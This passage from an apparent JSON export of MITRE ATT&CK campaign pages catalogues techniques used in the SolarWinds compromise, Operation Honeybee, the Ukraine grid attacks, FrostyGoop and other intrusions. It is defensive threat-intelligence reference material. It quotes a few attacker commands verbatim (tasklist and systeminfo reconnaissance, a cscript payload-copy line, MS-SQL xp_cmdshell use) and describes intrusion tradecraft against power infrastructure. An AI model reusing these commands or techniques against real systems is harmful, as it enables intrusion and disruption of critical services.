Enterprise T1078 Valid Accounts During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[4][17][20] .002 Domain Accounts During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.[1] .003 Local Accounts During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks.[1] .004 Cloud Accounts During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal.[1] Enterprise T1047 Windows Management Instrumentation During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement.[23][19] Software ID Name Description S0552 AdFind [7][1] S0154 Cobalt Strike [4][20] S0597 GoldFinder [17] S0588 GoldMax [17] S0002 Mimikatz [23][1] S0565 Raindrop [19][21] S0589 Sibot [17] S0559 SUNBURST [4][19][24][3][25][26] S0562 SUNSPOT [22] S0560 TEARDROP [19][26][4] S0682 TrailBlazer [1] References CrowdStrike. (2022, January 27). Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign. Retrieved February 7, 2022. SolarWinds. (2020, December 24). SolarWinds Security Advisory. Retrieved February 22, 2021. Sudhakar Ramakrishna . (2021, January 11). New Findings From Our Investigation of SUNBURST. Retrieved January 13, 2021. FireEye. (2020, December 13). Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor. Retrieved January 4, 2021. Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020. Unit 42. (2020, December 23). SolarStorm Supply Chain Attack Timeline. Retrieved March 24, 2023. MSTIC. (2020, December 18). Analyzing Solorigate, the compromised DLL file that started a sophisticated cyberattack, and how Microsoft Defender helps protect customers . Retrieved January 5, 2021. MSRC Team. (2021, February 18). Microsoft Internal Solorigate Investigation \u2013 Final Update. Retrieved May 14, 2021. NSA, FBI, DHS. (2021, April 15). Russian SVR Targets U.S. and Allied Networks. Retrieved April 16, 2021. UK NCSC. (2021, April 15). UK and US call out Russia for SolarWinds compromise. Retrieved April 16, 2021. Mandiant. (2020, April 27). Assembling the Russian Nesting Doll: UNC2452 Merged into APT29. Retrieved March 26, 2023. FBI, CISA, ODNI, NSA. (2022, January 5). Joint Statement by the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Office of the Director of National Intelligence (ODNI), and the National Security Agency (NSA). Retrieved March 26, 2023. Microsoft Threat Intelligence Center (MSTIC). (2021, May 27). New sophisticated email-based attack from NOBELIUM. Retrieved May 28, 2021. Secureworks CTU. (n.d.). IRON RITUAL. Retrieved February 24, 2022. MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020. Microsoft Threat Intelligence Center. (2021, October 25). NOBELIUM targeting delegated administrative privileges to facilitate broader attacks. Retrieved March 25, 2022. Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM\u2019s layered persistence. Retrieved March 8, 2021. Smith, L., Leathery, J., Read, B. (2021, March 4). New SUNSHUTTLE Second-Stage Backdoor Uncovered Targeting U.S.-Based Entity; Possible Connection to UNC2452. Retrieved March 12, 2021. MSTIC, CDOC, 365 Defender Research Team. (2021, January 20). Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop . Retrieved January 22, 2021. NCSC, CISA, FBI, NSA. (2021, May 7). Further TTPs associated with SVR cyber actors. Retrieved July 29, 2021. Symantec Threat Hunter Team. (2021, January 18). Raindrop: New Malware Discovered in SolarWinds Investigation. Retrieved January 19, 2021. CrowdStrike Intelligence Team. (2021, January 11). SUNSPOT: An Implant in the Build Process. Retrieved January 11, 2021. Microsoft 365 Defender Team. (2020, December 28). Using Microsoft 365 Defender to protect against Solorigate. Retrieved January 7, 2021. Symantec Threat Hunter Team. (2021, January 22). SolarWinds: How Sunburst Sends Data Back to the Attackers. Retrieved January 22, 2021. Stephen Eckels, Jay Smith, William Ballenthin. (2020, December 24). SUNBURST Additional Technical Details. Retrieved January 6, 2021. Check Point Research. (2020, December 22). SUNBURST, TEARDROP and the NetSec New Normal. Retrieved January 6, 2021. "
},
{
"id": 448,
"title": "Indian Critical Infrastructure Intrusions, Campaign C0043",
"path": "/campaigns/C0043/index.html",
"content": " Indian Critical Infrastructure Intrusions Indian Critical Infrastructure Intrusions is a sequence of intrusions from 2021 through early 2022 linked to People\u2019s Republic of China (PRC) threat actors, particularly RedEcho and Threat Activity Group 38 (TAG38). The intrusions appear focused on IT system breach in Indian electric utility entities and logistics firms, as well as potentially managed service providers operating within India. Although focused on OT-operating entities, there is no evidence this campaign was able to progress beyond IT breach and information gathering to OT environment access.[1][2] ID: C0043 First Seen: January 2021 [1] Last Seen: April 2022 [2] Version: 1.0 Created: 21 November 2024 Last Modified: 13 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains During Indian Critical Infrastructure Intrusions, RedEcho registered domains spoofing Indian critical infrastructure entities.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Indian Critical Infrastructure Intrusions, RedEcho network activity included SSL traffic over TCP 443 and HTTP traffic over non-standard ports.[1] Enterprise T1584 Compromise Infrastructure Indian Critical Infrastructure Intrusions included the use of compromised infrastructure, such as DVR and IP camera devices, for command and control purposes in ShadowPad activity.[2] Enterprise T1568 Dynamic Resolution During Indian Critical Infrastructure Intrusions, RedEcho used dynamic DNS domains associated with malicious infrastructure.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography During Indian Critical Infrastructure Intrusions, RedEcho used SSL for network communication.[1] Enterprise T1599 Network Boundary Bridging Indian Critical Infrastructure Intrusions involved the use of FRP to bridge network boundaries and overcome NAT.[2] Indian Critical Infrastructure Intrusions also involved the use of VPN tunnels with a potentially compromised MSP entity allowing for direct access to critical infrastructure entity networks.[3] Enterprise T1571 Non-Standard Port During Indian Critical Infrastructure Intrusions, RedEcho used non-standard ports such as TCP 8080 for HTTP communication.[1] Enterprise T1588 .004 Obtain Capabilities: Digital Certificates Indian Critical Infrastructure Intrusions included the use of digital certificates spoofing Microsoft.[2] Software ID Name Description S1144 FRP Indian Critical Infrastructure Intrusions included the use of FRP to enable remote access.[2] S0596 ShadowPad Indian Critical Infrastructure Intrusions included the use of ShadowPad malware for operations.[2][3] References Recorded Future Insikt Group. (2021, February). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved November 21, 2024. Recorded Future Insikt Group. (2022, April 6). Continued Targeting of Indian Power Grid Assets by Chinese State-Sponsored Activity Group. Retrieved November 21, 2024. Dragos. (2022). 2021 ICS Cybersecurity Year in Review. Retrieved November 21, 2024. "
},
{
"id": 449,
"title": "Operation Honeybee, Campaign C0006",
"path": "/campaigns/C0006/index.html",
"content": " Operation Honeybee Operation Honeybee was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. Operation Honeybee initially targeted South Korea, but expanded to include Vietnam, Singapore, Japan, Indonesia, Argentina, and Canada. Security researchers assessed the threat actors were likely Korean speakers based on metadata used in both lure documents and executables, and named the campaign \"Honeybee\" after the author name discovered in malicious Word documents.[1] ID: C0006 First Seen: August 2017 [1] Last Seen: February 2018 [1] Version: 1.1 Created: 16 September 2022 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control During Operation Honeybee, the threat actors used the malicious NTWDBLIB.DLL and cliconfig.exe to bypass UAC protections.[1] Enterprise T1583 .001 Acquire Infrastructure: Domains During Operation Honeybee, threat actors registered domains for C2.[1] .004 Acquire Infrastructure: Server For Operation Honeybee, at least one identified persona was used to register for a free account for a control server.[1] Enterprise T1071 .002 Application Layer Protocol: File Transfer Protocols During Operation Honeybee, the threat actors had the ability to use FTP for C2.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation Honeybee, the threat actors uses zip to pack collected files before exfiltration.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During Operation Honeybee, various implants used batch scripting and cmd.exe for execution.[1] .005 Command and Scripting Interpreter: Visual Basic For Operation Honeybee, the threat actors used a Visual Basic script embedded within a Word document to download an implant.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service During Operation Honeybee, threat actors installed DLLs and backdoors as Windows services.[1] Enterprise T1005 Data from Local System During Operation Honeybee, the threat actors collected data from compromised hosts.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During Operation Honeybee, stolen data was copied into a text file using the format From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt prior to compression, encoding, and exfiltration.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Operation Honeybee, malicious files were decoded prior to execution.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts During Operation Honeybee, attackers created email addresses to register for a free account for a control server used for the implants.[1] Enterprise T1041 Exfiltration Over C2 Channel During Operation Honeybee, the threat actors uploaded stolen files to their C2 servers.[1] Enterprise T1083 File and Directory Discovery During Operation Honeybee, the threat actors used a malicious DLL to search for files with specific keywords.[1] Enterprise T1574 .011 Hijack Execution Flow: Services Registry Permissions Weakness During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the svchost.exe process.[1] Enterprise T1070 .004 Indicator Removal: File Deletion During Operation Honeybee, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.[1] Enterprise T1105 Ingress Tool Transfer During Operation Honeybee, the threat actors downloaded additional malware and malicious scripts onto a compromised host.[1] Enterprise T1036 Masquerading During Operation Honeybee, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.[1] .005 Match Legitimate Resource Name or Location During Operation Honeybee, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.[1] Enterprise T1112 Modify Registry During Operation Honeybee, the threat actors used batch files that modified registry keys.[1] Enterprise T1106 Native API During Operation Honeybee, the threat actors deployed malware that used API calls, including CreateProcessAsUser.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File During Operation Honeybee, the threat actors used Base64 to encode files with a custom key.[1] Enterprise T1588 .004 Obtain Capabilities: Digital Certificates For Operation Honeybee, the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.[1] Enterprise T1057 Process Discovery During Operation Honeybee, the threat actors obtained a list of running processes on a victim machine using cmd /c tasklist > %temp%\\temp.ini.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During Operation Honeybee, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.[1] Enterprise T1082 System Information Discovery During Operation Honeybee, the threat actors collected the computer name, OS, and other system information using cmd /c systeminfo > %temp%\\ temp.ini.[1] Enterprise T1569 .002 System Services: Service Execution During Operation Honeybee, threat actors ran sc start to start the COMSysApp as part of the service hijacking and sc stop to stop and reconfigure the COMSysApp.[1] Enterprise T1204 .002 User Execution: Malicious File During Operation Honeybee, threat actors relied on a victim to enable macros within a malicious Word document.[1] Software ID Name Description S0106 cmd [1] S0075 Reg [1] S0464 SYSCON Operation Honeybee included the use of an upgraded version of SYSCON.[1] S0096 Systeminfo [1] S0057 Tasklist [1] References Sherstobitoff, R. (2018, March 02). McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid Groups. Retrieved May 16, 2018. "
},
{
"id": 450,
"title": "2016 Ukraine Electric Power Attack, Campaign C0025",
"path": "/campaigns/C0025/index.html",
"content": " 2016 Ukraine Electric Power Attack 2016 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used Industroyer malware to target and disrupt distribution substations within the Ukrainian power grid. This campaign was the second major public attack conducted against Ukraine by Sandworm Team.[1][2] ID: C0025 First Seen: December 2016 [1][2] Last Seen: December 2016 [1][2] Version: 1.0 Created: 31 March 2023 Last Modified: 16 April 2025 Version Permalink Live Version Groups ID Name Description G0034 Sandworm Team [3][4] Techniques Used Domain ID Name Use Enterprise T1098 Account Manipulation During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.[2] Enterprise T1110 Brute Force During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[2] .003 Command and Scripting Interpreter: Windows Command Shell During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL.[2] .005 Command and Scripting Interpreter: Visual Basic During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server.[2] Enterprise T1554 Compromise Host Software Binary During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer.[1] Enterprise T1136 Create Account During the 2016 Ukraine Electric Power Attack, Sandworm Team added a login to a SQL Server with sp_addlinkedsrvlogin.[2] .002 Domain Account During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.[2] Enterprise T1543 .003 Create or Modify System Process: Windows Service During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. [5] Enterprise T1562 .002 Impair Defenses: Disable Windows Event Logging During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems.[2] Enterprise T1570 Lateral Tool Transfer During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.[5] .008 Masquerading: Masquerade File Type During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files.[2] .010 Masquerading: Masquerade Account Name During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System).[2] Enterprise T1027 Obfuscated Files or Information During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.[1] .002 Software Packing During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz.[2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials.[2] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares.[2] Enterprise T1018 Remote System Discovery During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.[2] Enterprise T1505 .001 Server Software Component: SQL Stored Procedures During the 2016 Ukraine Electric Power Attack, Sandworm Team used various MS-SQL stored procedures.[2] Enterprise T1047 Windows Management Instrumentation During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. [2] ICS T0807 Command-Line Interface During the 2016 Ukraine Electric Power Attack, Sandworm Team supplied the name of the payload DLL to Industroyer via a command line parameter.[1] ICS T0867 Lateral Tool Transfer During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:\\Backinfo\\ufn.vbs C:\\Backinfo\\101.dll C:\\Delta\\101.dll[2] ICS T0849 Masquerading During the 2016 Ukraine Electric Power Attack, Sandworm Team transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking.[2] ICS T0886 Remote Services During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network.[2] ICS T0853 Scripting During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.[2] ICS T0859 Valid Accounts During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems.[2] Software ID Name Description S0604 Industroyer Within the 2016 Ukraine Electric Power Attack, Industroyer was used to target and disrupt the Ukrainian power grid substation components.[2][1] References Anton Cherepanov. (2017, June 12). Win32/Industroyer: A new threat for industrial controls systems. Retrieved December 18, 2020. Joe Slowik. (2018, October 12). Anatomy of an Attack: Detecting and Defeating CRASHOVERRIDE. Retrieved December 18, 2020. Scott W. Brady. (2020, October 15). United States vs. Yuriy Sergeyevich Andrienko et al.. Retrieved November 25, 2020. Joe Slowik 2019, August 15 CRASHOVERRIDE: Reassessing the 2016 Ukraine Electric Power Event as a Protection-Focused Attack Retrieved. 2019/10/22 Dragos Inc.. (2017, June 13). CRASHOVERRIDE Analysis of the Threat to Electric Grid Operations. Retrieved December 18, 2020. "
},
{
"id": 451,
"title": "FrostyGoop Incident, Campaign C0041",
"path": "/campaigns/C0041/index.html",
"content": " FrostyGoop Incident FrostyGoop Incident took place in January 2024 against a municipal district heating company in Ukraine. Following initial access via likely exploitation of external facing services, FrostyGoop was used to manipulate ENCO control systems via legitimate Modbus commands to impact the delivery of heating services to Ukrainian civilians.[1][2] ID: C0041 First Seen: January 2024 [1] Last Seen: January 2024 [1] Version: 1.0 Created: 20 November 2024 Last Modified: 05 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 Application Layer Protocol During FrostyGoop Incident, the adversary initiated Layer Two Tunnelling Protocol (L2TP) connections to Moscow-based IP addresses.[1] Enterprise T1190 Exploit Public-Facing Application FrostyGoop Incident was likely enabled by the adversary exploiting an unknown vulnerability in an external-facing router.[1] Enterprise T1562 .010 Impair Defenses: Downgrade Attack During FrostyGoop Incident, the adversary downgraded firmware on victim devices in order to impair visibility into the process environment.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During FrostyGoop Incident, the adversary retrieved the contents of the Security Account Manager (SAM) hive in the victim environment for credential capture.[1] Enterprise T1505 .003 Server Software Component: Web Shell FrostyGoop Incident deployed a ReGeorg variant web shell to impacted systems following initial access for persistence.[1] ICS T0826 Loss of Availability During FrostyGoop Incident, the adversary modified victim control system parameters resulting in the loss of heating services to impacted district heating customers.[1] ICS T0829 Loss of View During FrostyGoop Incident, the adversary initiated a firmware downgrade on victim devices to a version lacking monitoring.[1] ICS T0836 Modify Parameter In FrostyGoop Incident, the adversary caused the victim controllers to report incorrect measurements by modifying parameters.[1] ICS T0857 System Firmware During FrostyGoop Incident, the adversary initiated a firmware downgrade on impacted devices.[1] Software ID Name Description S1165 FrostyGoop FrostyGoop Incident used FrostyGoop to manipulate OT devices to induce a district heating disruption in Ukraine.[1] References Mark Graham, Carolyn Ahlers, Kyle O'Meara; Dragos. (2024, July). Impact of FrostyGoop ICS Malware on Connected OT Systems. Retrieved November 20, 2024. Nozomi Networks Labs. (2024, July 24). Cyberwarfare Targeting OT: Protecting Against FrostyGoop/BUSTLEBERM Malware. Retrieved November 20, 2024. "
},
{
"id": 452,
"title": "Versa Director Zero Day Exploitation, Campaign C0039",
"path": "/campaigns/C0039/index.html",
"content": " Versa Director Zero Day Exploitation Versa Director Zero Day Exploitation was conducted by Volt Typhoon from early June through August 2024 as zero-day exploitation of Versa Director servers controlling software-defined wide area network (SD-WAN) applications. Since tracked as CVE-2024-39717, exploitation focused on credential capture from compromised Versa Director servers at managed service providers (MSPs) and internet service providers (ISPs) to enable follow-on access to service provider clients. Versa Director Zero Day Exploitation was followed by the delivery of the VersaMem web shell for both credential theft and follow-on code execution.[1] ID: C0039 First Seen: June 2024 [1] Last Seen: August 2024 [1] Version: 1.0 Created: 27 August 2024 Last Modified: 28 September 2024 Version Permalink Live Version Groups ID Name Description G1017 Volt Typhoon Versa Director Zero Day Exploitation was conducted by Volt Typhoon between June and August 2024.[1] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers.[1] Enterprise T1584 .008 Compromise Infrastructure: Network Devices Versa Director Zero Day Exploitation used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers.[1] Enterprise T1587 .001 Develop Capabilities: Malware Versa Director Zero Day Exploitation involved the development of a new web shell variant, VersaMem.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography Versa Director Zero Day Exploitation used HTTPS for command and control of compromised Versa Director servers.[1] Enterprise T1190 Exploit Public-Facing Application Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution.[1] Enterprise T1056 Input Capture Versa Director Zero Day Exploitation intercepted and harvested credentials from user logins to compromised devices.[1] Enterprise T1095 Non-Application Layer Protocol Versa Director Zero Day Exploitation used a non-standard TCP session to initialize communication prior to establishing HTTPS command and control.[1] Enterprise T1505 .003 Server Software Component: Web Shell Versa Director Zero Day Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity.[1] Software ID Name Description S1154 VersaMem VersaMem was used during Versa Director Zero Day Exploitation by Volt Typhoon.[1] References Black Lotus Labs. (2024, August 27). Taking The Crossroads: The Versa Director Zero-Day Exploitaiton. Retrieved August 27, 2024. "
},
{
"id": 453,
"title": "2015 Ukraine Electric Power Attack, Campaign C0028",
"path": "/campaigns/C0028/index.html",
"content": " 2015 Ukraine Electric Power Attack 2015 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used BlackEnergy (specifically BlackEnergy3) and KillDisk to target and disrupt transmission and distribution substations within the Ukrainian power grid. This campaign was the first major public attack conducted against the Ukrainian power grid by Sandworm Team. ID: C0028 First Seen: December 2015 [1] Last Seen: January 2016 [1] Version: 1.0 Created: 27 September 2023 Last Modified: 18 December 2024 Version Permalink Live Version Groups ID Name Description G0034 Sandworm Team [2] [3] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. [1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. [1] Enterprise T1136 .002 Create Account: Domain Account During the 2015 Ukraine Electric Power Attack, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement. [1] Enterprise T1133 External Remote Services During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. [1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security. [1] Enterprise T1070 .004 Indicator Removal: File Deletion During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. [1] Enterprise T1105 Ingress Tool Transfer During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. [1] Enterprise T1056 .001 Input Capture: Keylogging During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. [1][4] Enterprise T1570 Lateral Tool Transfer During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. [1] Enterprise T1112 Modify Registry During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. [1]. Enterprise T1040 Network Sniffing During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy\u2019s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid\u2019s industrial control systems. [5] Enterprise T1566 .001 Phishing: Spearphishing Attachment During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. [4] Enterprise T1055 Process Injection During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. [1] Enterprise T1018 Remote System Discovery During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network as well, giving adversaries the ability to discover operational assets. [5] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. [1] Enterprise T1204 .002 User Execution: Malicious File During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. [4] Enterprise T1078 Valid Accounts During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [4] ICS T0803 Block Command Message During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked command messages by using malicious firmware to render serial-to-ethernet converters inoperable. [4] ICS T0804 Block Reporting Message During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked reporting messages by using malicious firmware to render serial-to-ethernet converters inoperable. [4] ICS T0805 Block Serial COM During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet converter firmware, rendering the devices not operational. This meant that communication to the downstream serial devices was either not possible or more difficult. [1] ICS T0885 Commonly Used Port During the 2015 Ukraine Electric Power Attack, Sandworm Team used port 443 to communicate with their C2 servers. [1] ICS T0884 Connection Proxy During the 2015 Ukraine Electric Power Attack, Sandworm Team established an internal proxy prior to the installation of backdoors within the network. [1] ICS T0813 Denial of Control During the 2015 Ukraine Electric Power Attack, KillDisk rendered devices that were necessary for remote recovery unusable, including at least one RTU. Additionally, Sandworm Team overwrote the firmware for serial-to-ethernet converters, denying operators control of the downstream devices. [1][4] ICS T0814 Denial of Service During the 2015 Ukraine Electric Power Attack, power company phone line operators were hit with a denial of service attack so that they couldn\u2019t field customers\u2019 calls about outages. Operators were also denied service to their downstream devices when their serial-to-ethernet converters had their firmware overwritten, which bricked the devices. [4] ICS T0816 Device Restart/Shutdown During the 2015 Ukraine Electric Power Attack, Sandworm Team scheduled the uninterruptable power supplies (UPS) to shutdown data and telephone servers via the UPS management interface. [4][1] ICS T0822 External Remote Services During the 2015 Ukraine Electric Power Attack, Sandworm Team used Valid Accounts taken from the Windows Domain Controller to access the control system Virtual Private Network (VPN) used by grid operators. [1] ICS T0823 Graphical User Interface During the 2015 Ukraine Electric Power Attack, Sandworm Team utilized HMI GUIs in the SCADA environment to open breakers. [4] ICS T0867 Lateral Tool Transfer During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the ICS network. [1] ICS T0826 Loss of Availability During the 2015 Ukraine Electric Power Attack, Sandworm Team opened the breakers at the infected sites, shutting the power off for thousands of businesses and households for around 6 hours. [4][1] ICS T0827 Loss of Control During the 2015 Ukraine Electric Power Attack, operators were shut out of their equipment either through the denial of peripheral use or the degradation of equipment. Operators were therefore unable to recover from the incident through their traditional means. Much of the power was restored manually. [4] ICS T0828 Loss of Productivity and Revenue During the 2015 Ukraine Electric Power Attack, power breakers were opened which caused the operating companies to be unable to deliver power, and left thousands of businesses and households without power for around 6 hours. [4][1] ICS T0831 Manipulation of Control During the 2015 Ukraine Electric Power Attack, Sandworm Team opened live breakers via remote commands to the HMI, causing blackouts. [4] ICS T0886 Remote Services During the 2015 Ukraine Electric Power Attack, Sandworm Team used an IT helpdesk software to move the mouse on ICS control devices to maliciously release electricity breakers. [2] ICS T0846 Remote System Discovery During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered operational assets once on the OT network. [5] [1] ICS T0857 System Firmware During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet gateways with custom firmware to make systems either disabled, shutdown, and/or unrecoverable. [4] ICS T0855 Unauthorized Command Message During the 2015 Ukraine Electric Power Attack, Sandworm Team issued unauthorized commands to substation breaks after gaining control of operator workstations and accessing a distribution management system (DMS) application. [4] ICS T0859 Valid Accounts During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems. Sandworm Team used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications. [4][1] Software ID Name Description S0089 BlackEnergy [1] S0607 KillDisk [1] References Booz Allen Hamilton. (2016). When The Lights Went Out. Retrieved December 18, 2024. Andy Greenberg. (2017, June 28). How an Entire Nation Became Russia's Test Lab for Cyberwar. Retrieved September 27, 2023. Scott W. Brady. (2020, October 15). United States vs. Yuriy Sergeyevich Andrienko et al.. Retrieved November 25, 2020. Electricity Information Sharing and Analysis Center; SANS Industrial Control Systems. (2016, March 18). Analysis of the Cyber Attack on the Ukranian Power Grid: Defense Use Case. Retrieved March 27, 2018. Charles McLellan. (2016, March 4). How hackers attacked Ukraine's power grid: Implications for Industrial IoT security. Retrieved September 27, 2023. "
},
{
"id": 454,
"title": "C0032, Campaign C0032",
"path": "/campaigns/C0032/index.html",
